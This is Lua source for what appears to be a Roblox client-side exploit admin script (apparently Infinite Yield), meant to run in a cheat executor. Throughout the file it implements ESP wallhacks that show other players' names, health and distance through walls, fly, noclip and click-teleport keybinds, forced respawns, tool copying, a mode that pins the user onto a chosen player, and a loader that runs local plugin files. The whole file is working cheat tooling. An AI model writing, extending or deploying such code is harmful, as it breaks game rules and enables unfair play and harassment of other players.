CMDs[#CMDs + 1] = {NAME = 'givetools [plr]', DESC = 'Give your tools to a player'}
CMDs[#CMDs + 1] = {NAME = 'copytools [plr]', DESC = 'Copies a players tools'}
CMDs[#CMDs + 1] = {NAME = 'autocleantools/ act', DESC = 'fixes autoclean tools'}
CMDs[#CMDs + 1] = {NAME = 'autocleanhats/ ach', DESC = 'fixes autoclean hats'}
wait()

for i = 1, #CMDs do
	local newcmd = Holder.Example:Clone()
	newcmd.Parent = Holder.CMDs
	newcmd.Visible = false
	newcmd.Text = "" .. CMDs[i].NAME
	newcmd.Name = 'CMD'
	newcmd.MouseButton1Click:Connect(function()
		notify(CMDs[i].NAME,CMDs[i].DESC)
	end)
end

IndexContents('',true)

function FindInTable(Table, Name)
	for i,v in pairs(Table) do
		if v == Name then
			return true
		end
	end
	return false
end


function GetInTable(Table, Name)
	for i = 1, #Table do
		if Table[i] == Name then
			return i
		end
	end
	return false
end

function respawn(plr)
	if r15(plr) then
		plr.Character.Humanoid.Health = 0
		wait(0.1)
		plr.Character.Head.CFrame = CFrame.new(1000000,0,1000000)
		plr.Character.HumanoidRootPart:Destroy()
	else		
		plr.Character:Destroy()
		local M = Instance.new('Model', workspace) M.Name = 'respawn_iy'
		local H = Instance.new('Humanoid', M)
		local T = Instance.new('Part', M) T.Name = 'Torso' T.CanCollide = false T.Transparency = 1
		plr.Character = M
	end
end

function refresh(plr)
	spawn(function()
		local rpos = plr.Character.HumanoidRootPart.Position
		wait()
		respawn(plr)
		wait()
		repeat wait() until plr.Character ~= nil and plr.Character:FindFirstChild('HumanoidRootPart')
		plr.Character:MoveTo(rpos)
	end)
end

godded = false
local oldCframe
local currentTool

Players.LocalPlayer.CharacterAdded:Connect(function()
	wait(0.3)
	if spawnpoint and not godded and spawnpos ~= nil then
		Players.LocalPlayer.Character.HumanoidRootPart.CFrame = spawnpos
	end
	bangplr = nil
	execCmd('clip')
	if godded then
		repeat wait() until Players.LocalPlayer.Character ~= nil and Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and Players.LocalPlayer.Character:FindFirstChild('Humanoid')
		Players.LocalPlayer.Character.Humanoid:SetStateEnabled(15,false)
		Players.LocalPlayer.Character.Humanoid:SetStateEnabled(16,false)
		local r=Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		for i = 1,5 do
			r.CFrame = oldCframe
		end
		if currentTool ~= nil then
			local nt = Players.LocalPlayer.Backpack:FindFirstChild(currentTool.Name)
			nt.Parent = Players.LocalPlayer.Character
			currentTool = nil
		end
	end
end)

Players.LocalPlayer.CharacterRemoving:Connect(function()
    if Players.LocalPlayer.Character then
        local r = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if r ~= nil then oldCframe = r.CFrame end
		currentTool = Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
    end
end)

local std={}
std.inTable=function(tbl,val)
    if tbl==nil then return false end
    for _,v in pairs(tbl)do
        if v==val then return true end
    end 
	return false
end

function getstring(begin)
	local start = begin-1
	local AA = '' for i,v in pairs(cargs) do
		if i > start then
			if AA ~= '' then
				AA = AA .. ' ' .. v
			else
				AA = AA .. v
			end
		end
	end
	return AA
end

local findCmd=function(cmd_name)
	for i,v in pairs(cmds)do
		if v.NAME:lower()==cmd_name:lower() or std.inTable(v.ALIAS,cmd_name:lower()) then
			return v
		end
	end
	return customAlias[cmd_name:lower()]
end

local function splitString(str,delim)
	local broken = {}
	if delim == nil then delim = "," end
		for w in string.gmatch(str,"[^"..delim.."]+") do
			table.insert(broken,w)
		end
	return broken
end

local historyCount = 0
local cmdHistory = {}
local split=" "
lastBreakTime = 0
function execCmd(cmdStr,speaker)
	spawn(function()
		if canvasPos ~= nil then
			CMDsF.CanvasPosition = Vector2.new(0, canvasPos)
			canvasTop = false
		end
		local rawCmdStr = cmdStr
		cmdStr = string.gsub(cmdStr,"\\\\","%%BackSlash%%")
		local commandsToRun = splitString(cmdStr,"\\")
		for i,v in pairs(commandsToRun) do
			v = string.gsub(v,"%%BackSlash%%","\\")
			local x,y,num = v:find("^(%d+)%^")
			local cmdDelay = 0
			if num then
				v = v:sub(y+1)
				local x,y,del = v:find("^([%d%.]+)%^")
				if del then
					v = v:sub(y+1)
					cmdDelay = tonumber(del) or 0
				end
			end
		num = tonumber(num or 1)
		local args = splitString(v,split)
		local cmd = findCmd(args[1])
		if cmd then
			table.remove(args,1)
			cargs = args
			if speaker == Players.LocalPlayer then
				if cmdHistory[1] ~= rawCmdStr then table.insert(cmdHistory,1,rawCmdStr) end
			end
			if #cmdHistory > 20 then table.remove(cmdHistory) end
			local cmdStartTime = tick()
			for rep = 1,num do
				if lastBreakTime > cmdStartTime then break end
					pcall(function()
						cmd.FUNC(args, speaker)
					end)
					if cmdDelay ~= 0 then wait(cmdDelay) end
				end
			end
		end
	end)	
end	

function addcmd(name,alias,func,plgn)
	cmds[#cmds+1]=
	{
		NAME=name;
		ALIAS=alias;
		FUNC=func;
		PLUGIN=plgn;
	}
end

function addbind(cmd,key)
	binds[#binds+1]=
	{
		COMMAND=cmd;
		KEY=key;
	}
end

function addcmdtext(text,name,desc)
	local newcmd = Holder.Example:Clone()
	newcmd.Parent = Holder.CMDs
	newcmd.Visible = false
	newcmd.Text = text
	newcmd.Name = 'PLUGIN_'..name
	if desc then
		newcmd.MouseButton1Click:Connect(function()
			notify(text,desc)
		end)
	end
end

local SpecialPlayerCases = {
	["all"] = function(speaker)return Players:GetPlayers() end,
	["others"] = function(speaker)
		local plrs = {}
		for i,v in pairs(Players:GetPlayers()) do
			if v ~= speaker then
				table.insert(plrs,v)
			end
		end
		return plrs
	 end,
	["me"] = function(speaker)return {speaker} end,
	["#(%d+)"] = function(speaker,args,currentList)
		local returns = {}
		local randAmount = tonumber(args[1])
		local players = {unpack(currentList)}
		for i = 1,randAmount do
			if #players == 0 then break end
			local randIndex = math.random(1,#players)
			table.insert(returns,players[randIndex])
			table.remove(players,randIndex)
		end
		return returns
	end,
	["random"] = function(speaker,args,currentList)
		local players = currentList
		return {players[math.random(1,#players)]}
	end,
	["%%(.+)"] = function(speaker,args)
		local returns = {}
		local team = args[1]
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team and string.sub(string.lower(plr.Team.Name),1,#team) == string.lower(team) then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["allies"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team == team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["enemies"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team ~= team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["team"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team == team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["nonteam"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team ~= team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["friends"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if plr:IsFriendsWith(speaker.UserId) and plr ~= speaker then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["nonfriends"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if not plr:IsFriendsWith(speaker.UserId) and plr ~= speaker then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["guests"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Guest then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["bacons"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Character:FindFirstChild('Pal Hair') or plr.Character:FindFirstChild('Kate Hair') then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["age(%d+)"] = function(speaker,args)
		local returns = {}
		local age = tonumber(args[1])
		if not age == nil then return end
		for _,plr in pairs(Players:GetPlayers()) do
		if plr.AccountAge <= age then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["rad(%d+)"] = function(speaker,args)
		local returns = {}
		local radius = tonumber(args[1])
		local speakerChar = speaker.Character
		if not speakerChar or not speakerChar:FindFirstChild("HumanoidRootPart") then return end
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
				local magnitude = (plr.Character:FindFirstChild("HumanoidRootPart").Position-speakerChar.HumanoidRootPart.Position).magnitude
				if magnitude <= radius then table.insert(returns,plr) end
			end
		end
		return returns
	end
}

local function toTokens(str)
	local tokens = {}
	for op,name in string.gmatch(str,"([+-])([^+-]+)") do
		table.insert(tokens,{Operator = op,Name = name})
	end
	return tokens
end

local function onlyIncludeInTable(tab,matches)
	local matchTable = {}
	local resultTable = {}
	for i,v in pairs(matches) do matchTable[v.Name] = true end
	for i,v in pairs(tab) do if matchTable[v.Name] then table.insert(resultTable,v) end end
	return resultTable
end

local function removeTableMatches(tab,matches)
	local matchTable = {}
	local resultTable = {}
	for i,v in pairs(matches) do matchTable[v.Name] = true end
	for i,v in pairs(tab) do if not matchTable[v.Name] then table.insert(resultTable,v) end end
	return resultTable
end

local function getPlayersByName(name)
	local found = {}
	for i,v in pairs(Players:GetChildren()) do
		if string.sub(string.lower(v.Name),1,#name) == string.lower(name) then
			table.insert(found,v)
		end
	end
	return found
end

function getPlayer(list,speaker)
	if list == nil then return {speaker.Name} end
	local nameList = splitString(list,",")
	
	local foundList = {}
	
	for _,name in pairs(nameList) do
		if string.sub(name,1,1) ~= "+" and string.sub(name,1,1) ~= "-" then name = "+"..name end
		local tokens = toTokens(name)
		local initialPlayers = Players:GetPlayers()
		
		for i,v in pairs(tokens) do
			if v.Operator == "+" then
				local tokenContent = v.Name
				local foundCase = false
				for regex,case in pairs(SpecialPlayerCases) do
					local matches = {string.match(tokenContent,"^"..regex.."$")}
					if #matches > 0 then
						foundCase = true
						initialPlayers = onlyIncludeInTable(initialPlayers,case(speaker,matches,initialPlayers))
					end
				end
				if not foundCase then
					initialPlayers = onlyIncludeInTable(initialPlayers,getPlayersByName(tokenContent))
				end
			else
				local tokenContent = v.Name
				local foundCase = false
				for regex,case in pairs(SpecialPlayerCases) do
					local matches = {string.match(tokenContent,"^"..regex.."$")}
					if #matches > 0 then
						foundCase = true
						initialPlayers = removeTableMatches(initialPlayers,case(speaker,matches,initialPlayers))
					end
				end
				if not foundCase then
					initialPlayers = removeTableMatches(initialPlayers,getPlayersByName(tokenContent))
				end
			end
		end
		
		for i,v in pairs(initialPlayers) do table.insert(foundList,v) end
	end
	
	local foundNames = {}
	for i,v in pairs(foundList) do table.insert(foundNames,v.Name) end
	
	return foundNames
end

local getprfx=function(strn)
    if strn:sub(1,string.len(prefix))==prefix then return{'cmd',string.len(prefix)+1}
    end return
end

function do_exec(str, plr)
	str = str:gsub('/e ', '')
	local t = getprfx(str)
	if not t then return end
	str = str:sub(t[2])
	if t[1]=='cmd' then
		execCmd(str, plr)
		IndexContents('',true,false,true)
	end
end


Players.LocalPlayer.Chatted:connect(function(message)
	do_exec(message, Players.LocalPlayer)
end)

Holder.Cmdbar.Changed:connect(function(property)
	if property == "Text" and Holder.Cmdbar:IsFocused() then
		IndexContents(Holder.Cmdbar.Text,true,true)
	end
end)

Holder.Cmdbar.FocusLost:connect(function(enterpressed)
	if enterpressed then
		execCmd(Holder.Cmdbar.Text,Players.LocalPlayer)
	end
	Holder.Cmdbar.Text = "Chocolate Bar"
	IndexContents('',true,false,true)
	if canvasPos ~= nil then
		CMDsF.CanvasPosition = Vector2.new(0, canvasPos)
		canvasTop = false
	end
	if SettingsOpen == true then
		Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.2, true, nil)
	end
end)

Holder.Cmdbar.Focused:Connect(function() historyCount = 0 end)
UserInputService.InputBegan:Connect(function(input)
    if not Holder.Cmdbar:IsFocused() then return end
    if input.KeyCode == Enum.KeyCode.Up then
        historyCount = historyCount + 1
        if historyCount > #cmdHistory then historyCount = #cmdHistory end
        Holder.Cmdbar.Text = cmdHistory[historyCount] or ""
    elseif input.KeyCode == Enum.KeyCode.Down then
        historyCount = historyCount - 1
        if historyCount < 1 then historyCount = 1 end
        Holder.Cmdbar.Text = cmdHistory[historyCount] or ""
    end
end)

ESPenabled = false
CHMSenabled = false

function round(num, numDecimalPlaces)
    local mult = 10^(numDecimalPlaces or 0)
    return math.floor(num * mult + 0.5) / mult
  end

function ESP(plr)
	spawn(function()
		local refreshing = true
		for i,v in pairs(PARENT:GetChildren()) do
			if v.Name == plr.Name..'_ESP' then
				v:Destroy()
			end
		end
		wait()
		if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not PARENT:FindFirstChild(plr.Name..'_ESP') then
			local ESPholder = Instance.new("Folder", PARENT)
			ESPholder.Name = plr.Name..'_ESP'
			for b,n in pairs (plr.Character:GetChildren()) do
				if (n:IsA("BasePart")) then
					local a = Instance.new("BoxHandleAdornment", ESPholder)
					a.Name = plr.Name
					a.Adornee = n
					a.AlwaysOnTop = true
					a.ZIndex = 0
					a.Size = n.Size
					a.Transparency = 0.7
					if plr.TeamColor == Players.LocalPlayer.TeamColor then
						a.Color = BrickColor.new("Lime green")
					else
						a.Color = BrickColor.new("Really red")
					end
				end
			end
            if plr.Character and plr.Character:FindFirstChild('Head') then
				local BillboardGui = Instance.new("BillboardGui", ESPholder)
				local TextLabel = Instance.new("TextLabel")
				BillboardGui.Adornee = plr.Character.Head
				BillboardGui.Name = plr.Name
				BillboardGui.Size = UDim2.new(0, 100, 0, 150)
				BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
				BillboardGui.AlwaysOnTop = true
				TextLabel.Parent = BillboardGui
				TextLabel.BackgroundTransparency = 1
				TextLabel.Position = UDim2.new(0, 0, 0, -50)
				TextLabel.Size = UDim2.new(0, 100, 0, 100)
				TextLabel.Font = Enum.Font.SourceSansSemibold
				TextLabel.TextSize = 20
				TextLabel.TextColor3 = Color3.new(1, 1, 1)
				TextLabel.TextStrokeTransparency = 0
				TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
				plr.CharacterAdded:Connect(function()
					if ESPenabled then
						refreshing = false
						ESPholder:Destroy()
						repeat wait(1) until plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChild('Humanoid')
						ESP(plr)
					end
				end)
				game:GetService("RunService").RenderStepped:Connect(function()
					if refreshing and PARENT:FindFirstChild(plr.Name..'_ESP') and plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChild('Humanoid') then
						local pos = math.floor((Players.LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude)
						TextLabel.Text = 'Name: '..plr.Name..' | Health: '..round(plr.Character.Humanoid.Health, 1)..' | Studs: '..pos
					end
				end)
			end
		end
	end)
end

function CHMS(plr)
	spawn(function()
		local refreshing = true
		for i,v in pairs(PARENT:GetChildren()) do
			if v.Name == plr.Name..'_CHMS' then
				v:Destroy()
			end
		end
		wait()
		if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not PARENT:FindFirstChild(plr.Name..'_CHMS') then
			local ESPholder = Instance.new("Folder", PARENT)
			ESPholder.Name = plr.Name..'_CHMS'
			for b,n in pairs (plr.Character:GetChildren()) do
				if (n:IsA("BasePart")) then
					local a = Instance.new("BoxHandleAdornment", ESPholder)
					a.Name = plr.Name
					a.Adornee = n
					a.AlwaysOnTop = true
					a.ZIndex = 0
					a.Size = n.Size
					a.Transparency = 0.7
					if plr.TeamColor == Players.LocalPlayer.TeamColor then
						a.Color = BrickColor.new("Lime green")
					else
						a.Color = BrickColor.new("Really red")
					end
				end
			end
			plr.CharacterAdded:Connect(function()
				if CHMSenabled then
					refreshing = false
					ESPholder:Destroy()
					repeat wait(1) until plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChild('Humanoid')
					CHMS(plr)
				end
			end)
		end
	end)
end

function Locate(plr)
	spawn(function()
		local refreshing = true
		for i,v in pairs(PARENT:GetChildren()) do
			if v.Name == plr.Name..'_LC' then
				v:Destroy()
			end
		end
		wait()
		if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not PARENT:FindFirstChild(plr.Name..'_LC') then
			local ESPholder = Instance.new("Folder", PARENT)
			ESPholder.Name = plr.Name..'_LC'
			for b,n in pairs (plr.Character:GetChildren()) do
				if (n:IsA("BasePart")) then
					local a = Instance.new("BoxHandleAdornment", ESPholder)
					a.Name = plr.Name
					a.Adornee = n
					a.AlwaysOnTop = true
					a.ZIndex = 0
					a.Size = n.Size
					a.Transparency = 0.7
					if plr.TeamColor == Players.LocalPlayer.TeamColor then
						a.Color = BrickColor.new("Lime green")
					else
						a.Color = BrickColor.new("Really red")
					end
				end
			end
			if plr.Character and plr.Character:FindFirstChild('Head') then
				local BillboardGui = Instance.new("BillboardGui", ESPholder)
				local TextLabel = Instance.new("TextLabel")
				BillboardGui.Adornee = plr.Character.Head
				BillboardGui.Name = plr.Name
				BillboardGui.Size = UDim2.new(0, 100, 0, 150)
				BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
				BillboardGui.AlwaysOnTop = true
				TextLabel.Parent = BillboardGui
				TextLabel.BackgroundTransparency = 1
				TextLabel.Position = UDim2.new(0, 0, 0, -50)
				TextLabel.Size = UDim2.new(0, 100, 0, 100)
				TextLabel.Font = Enum.Font.SourceSansSemibold
				TextLabel.TextSize = 20
				TextLabel.TextColor3 = Color3.new(1, 1, 1)
				TextLabel.TextStrokeTransparency = 0
				TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
				plr.CharacterAdded:Connect(function()
					if ESPholder ~= nil and ESPholder.Parent ~= nil then
						refreshing = false
						ESPholder:Destroy()
						repeat wait(1) until plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChild('Humanoid')
						Locate(plr)
					end
				end)
				game:GetService("RunService").RenderStepped:Connect(function()
					if refreshing and PARENT:FindFirstChild(plr.Name..'_LC') and plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChild('Humanoid') then
						local pos = math.floor((Players.LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude)
						TextLabel.Text = 'Name: '..plr.Name..' | Health: '..round(plr.Character.Humanoid.Health, 1)..' | Studs: '..pos
					end
				end)
			end
		end
	end)
end

bindsGUI = KeybindEditor
awaitingInput = false
keySelected = false

function unkeybind(cmd,key)
	for i = #binds,1,-1 do
		if binds[i].COMMAND == cmd and binds[i].KEY == key then
			table.remove(binds, i)
		end
	end
	refreshbinds()
	updatesaves()
	if key == 'RightClick' or key == 'LeftClick' then
		notify('Keybinds Updated','Unbinded '..key..' from '..cmd)
	else
		notify('Keybinds Updated','Unbinded '..key:sub(14)..' from '..cmd)
	end
end

function refreshbinds()
	if Holder_2 then
		Holder_2:ClearAllChildren()
		Holder_2.CanvasSize = UDim2.new(0, 0, 0, 10)
		for i = 1, #binds do
			local YSize = 25
			local Position = ((i * YSize) - YSize)
			local newbind = Example_2:Clone()
			newbind.Parent = Holder_2
			newbind.Visible = true
			newbind.Position = UDim2.new(0,0,0, Position + 5)
			local input = tostring(binds[i].KEY)
			local key
			if input == 'RightClick' or input == 'LeftClick' then
				key = input
			else
				key = input:sub(14)
			end
			newbind.Text.Text = key.." > "..binds[i].COMMAND
			Holder_2.CanvasSize = UDim2.new(0,0,0, Position + 30)
			newbind.Text.Delete.MouseButton1Click:Connect(function()
				unkeybind(binds[i].COMMAND,binds[i].KEY)
			end)
		end
	end
end

refreshbinds()

PositionsFrame.Delete.MouseButton1Click:Connect(function()
	execCmd('cpos')
end)

function refreshwaypoints()
	if Holder_4 then
		Holder_4:ClearAllChildren()
		Holder_4.CanvasSize = UDim2.new(0, 0, 0, 10)
		for i = 1, #WayPoints do
			local YSize = 25
			local Position = ((i * YSize) - YSize)
			local newpoint = Example_4:Clone()
			newpoint.Parent = Holder_4
			newpoint.Visible = true
			newpoint.Position = UDim2.new(0,0,0, Position + 5)
			newpoint.Text.Text = WayPoints[i].NAME
			Holder_4.CanvasSize = UDim2.new(0,0,0, Position + 30)
			newpoint.Text.Delete.MouseButton1Click:Connect(function()
				execCmd('dpos '..WayPoints[i].NAME)
			end)
			newpoint.Text.TP.MouseButton1Click:Connect(function()
				execCmd("loadpos "..WayPoints[i].NAME)
			end)
		end
	end
end

refreshwaypoints()

function refreshaliases()
	if Holder_3 then
		Holder_3:ClearAllChildren()
		Holder_3.CanvasSize = UDim2.new(0, 0, 0, 10)
		for i = 1, #aliases do
			local YSize = 25
			local Position = ((i * YSize) - YSize)
			local newalias = Example_3:Clone()
			newalias.Parent = Holder_3
			newalias.Visible = true
			newalias.Position = UDim2.new(0,0,0, Position + 5)
			newalias.Text.Text = aliases[i].CMD.." > "..aliases[i].ALIAS
			Holder_3.CanvasSize = UDim2.new(0,0,0, Position + 30)
			newalias.Text.Delete.MouseButton1Click:Connect(function()
				execCmd('removealias '..aliases[i].ALIAS)
			end)
		end
	end
end

BindTo.MouseButton1Click:Connect(function()
	awaitingInput = true
	BindTo.Text = 'Press something'
end)

Add_2.MouseButton1Click:Connect(function()
	if keySelected then
		if string.find(Cmdbar_2.Text, "\\\\") then
			notify('Keybind Error','Only use one backslash to keybind multiple commands into one keybind or command')
		else
			addbind(Cmdbar_2.Text,keyPressed)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to '..Cmdbar_2.Text)
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to '..Cmdbar_2.Text)
			end
		end
	end
end)

Exit_2.MouseButton1Click:Connect(function()
	Cmdbar_2.Text = 'Command'
	BindTo.Text = 'Click to bind'
	keySelected = false
	KeybindEditor:TweenPosition(UDim2.new(0.5, -180, 0, -400), "InOut", "Quart", 0.5, true, nil)
end)

local function onInputBegan(input,gameProcessed)
	if awaitingInput then
		if input.UserInputType == Enum.UserInputType.Keyboard then
			keyPressed = tostring(input.KeyCode)
			BindTo.Text = keyPressed:sub(14)
		elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
			keyPressed = 'LeftClick'
			BindTo.Text = 'LeftClick'
		elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
			keyPressed = 'RightClick'
			BindTo.Text = 'RightClick'
		end
		awaitingInput = false
		keySelected = true
	end
	if not gameProcessed and #binds > 0 then
		for i,v in pairs(binds)do
			if input.UserInputType == Enum.UserInputType.Keyboard and v.KEY:lower()==tostring(input.KeyCode):lower() then
				execCmd(v.COMMAND,Players.LocalPlayer)
			elseif input.UserInputType == Enum.UserInputType.MouseButton1 and v.KEY:lower()=='leftclick' then
				execCmd(v.COMMAND,Players.LocalPlayer)
			elseif input.UserInputType == Enum.UserInputType.MouseButton2 and v.KEY:lower()=='rightclick' then
				execCmd(v.COMMAND,Players.LocalPlayer)
			end
		end
	end
end
 
UserInputService.InputBegan:connect(onInputBegan)

game:GetService('RunService').Stepped:connect(function()
	if bangplr then
		Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Players[bangplr].Character.HumanoidRootPart.CFrame
	end
	if spinenabled then
		pcall(function()
			spinning.Position = Players.LocalPlayer.Character.Head.Position
		end)
	end
end)

Fly.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('togglefly',keyPressed)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to toggle fly')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle fly')
		end
	end
end)

Noclip.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('togglenoclip',keyPressed)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to toggle noclip')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle noclip')
		end
	end
end)

Float.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('togglefloat',keyPressed)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to toggle float')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle float')
		end
	end
end)

IYMouse.Button1Down:connect(function()
	for i,v in pairs(binds) do
		if v.COMMAND == 'clicktp' then
			local input = v.KEY
			if input == 'RightClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) and Players.LocalPlayer.Character then
				Players.LocalPlayer.Character.HumanoidRootPart.CFrame = IYMouse.Hit + Vector3.new(0,7,0)
			elseif input == 'LeftClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and Players.LocalPlayer.Character then
				Players.LocalPlayer.Character.HumanoidRootPart.CFrame = IYMouse.Hit + Vector3.new(0,7,0)
			elseif UserInputService:IsKeyDown(Enum.KeyCode[input:sub(14)]) and Players.LocalPlayer.Character then
				Players.LocalPlayer.Character.HumanoidRootPart.CFrame = IYMouse.Hit + Vector3.new(0,7,0)
			end
		end
	end
end)

ClickTP.Select.MouseButton1Click:Connect(function()
	if keySelected then
		addbind('clicktp',keyPressed)
		refreshbinds()
		updatesaves()
		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
			notify('Keybinds Updated','Binded '..keyPressed..' to click tp')
		else
			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to click tp')
		end
	end
end)

PluginsGUI = PluginEditor.background

function refreshplugins()
	if Holder_5 then
		Holder_5:ClearAllChildren()
		Holder_5.CanvasSize = UDim2.new(0, 0, 0, 10)
		for i,v in pairs(PluginsTable) do
			local pName = v
			local YSize = 25
			local Position = ((i * YSize) - YSize)
			local newplugin = Example_5:Clone()
			newplugin.Parent = Holder_5
			newplugin.Visible = true
			newplugin.Position = UDim2.new(0,0,0, Position + 5)
			newplugin.Text.Text = pName
			Holder_5.CanvasSize = UDim2.new(0,0,0, Position + 30)
			newplugin.Text.Delete.MouseButton1Click:Connect(function()
				for i = #cmds,1,-1 do
					if cmds[i].PLUGIN == pName then
						table.remove(cmds, i)
					end
				end
				for i,v in pairs(Holder.CMDs:GetChildren()) do
					if v.Name == 'PLUGIN_'..pName then
						v:Destroy()
					end
				end
				for i,v in pairs(PluginsTable) do
					if v == pName then
						table.remove(PluginsTable, i)
						notify('Removed Plugin',pName..' was removed')
					end
				end
				IndexContents('',true)
				refreshplugins()
			end)
		end
		updatesaves()
	end
end

local PluginCache
function LoadPlugin(val,startup)
	local plugin

	function CatchedPluginLoad()
		plugin = loadfile(val)()
	end

	function handlePluginError(plerror)
		notify('Plugin Error','An error occurred with the plugin, "'..val..'" and it could not be loaded')
		if FindInTable(PluginsTable,val) then
			for i,v in pairs(PluginsTable) do
				if v == val then
					table.remove(PluginsTable,i)
				end
			end
		end

		print("Original Error: "..tostring(plerror))
		print("Plugin Error, stack traceback: "..tostring(debug.traceback()))

		plugin = nil

		return false
	end

	xpcall(CatchedPluginLoad, handlePluginError)

	if plugin ~= nil then
		if not startup then
			notify('Loaded Plugin',"Name: "..plugin["PluginName"].."\n".."Description: "..plugin["PluginDescription"])
		end
		addcmdtext('',val)
		addcmdtext(string.upper('--'..plugin["PluginName"]),val,plugin["PluginDescription"])
		for i,v in pairs(plugin["Commands"]) do 
			local cmdExt = ''
			local cmdName = i
			local function handleNames()
				cmdName = i
				if findCmd(cmdName..cmdExt) then
					if isNumber(cmdExt) then
						cmdExt = cmdExt+1
					else
						cmdExt = 1
					end
					handleNames()
				else
					cmdName = cmdName..cmdExt
				end
			end
			handleNames()
			addcmd(cmdName, v["Aliases"], v["Function"], val)
			if v["ListName"] and cmdExt == '' then
				addcmdtext(v["ListName"],val,v["Description"])
			else
				addcmdtext(cmdName,val,v["Description"])
			end
		end
		IndexContents('',true)
	elseif plugin == nil then
		plugin = nil
	end
end

function FindPlugins()
	if PluginsTable ~= nil and type(PluginsTable) == "table" then
		for i,v in pairs(PluginsTable) do
			LoadPlugin(v,true)
		end
		refreshplugins()
	end
end

PluginsGUI.AddPlugin.MouseButton1Click:connect(function()
	if PluginsGUI.FileName.Text:lower() == 'plugin file name' or PluginsGUI.FileName.Text:lower() == 'iy_fe.iy' or PluginsGUI.FileName.Text == 'iy_fe' then
		notify('Plugin Error','Please enter a valid plugin')
	else
		local file
		local fileName
		if PluginsGUI.FileName.Text:sub(-3) == '.iy' then
			pcall(function() file = readfile(PluginsGUI.FileName.Text) end)
			fileName = PluginsGUI.FileName.Text
		else
			pcall(function() file = readfile(PluginsGUI.FileName.Text..'.iy') end)
			fileName = PluginsGUI.FileName.Text..'.iy'
		end
		if file then
			if not FindInTable(PluginsTable, fileName) then
				table.insert(PluginsTable, fileName)
				LoadPlugin(fileName)
				refreshplugins()
			else
				notify('Plugin Error','This plugin is already added')
			end
		else
			notify('Plugin Error','Cannot locate file "'..fileName..'". Is the file in the correct folder?')
		end
	end
end)

if PluginsTable ~= nil or PluginsTable ~= {} then
	FindPlugins(PluginsTable)
end

Exit_3.MouseButton1Click:connect(function()
	PluginEditor:TweenPosition(UDim2.new(0.5, -180, 0, -400), "InOut", "Quart", 0.5, true, nil)
	PluginsGUI.FileName.Text = 'Plugin File Name'
end)

PluginsFrame.Add.MouseButton1Click:Connect(function()
	PluginEditor:TweenPosition(UDim2.new(0.5, -180, 0, 250), "InOut", "Quart", 0.5, true, nil)
end)

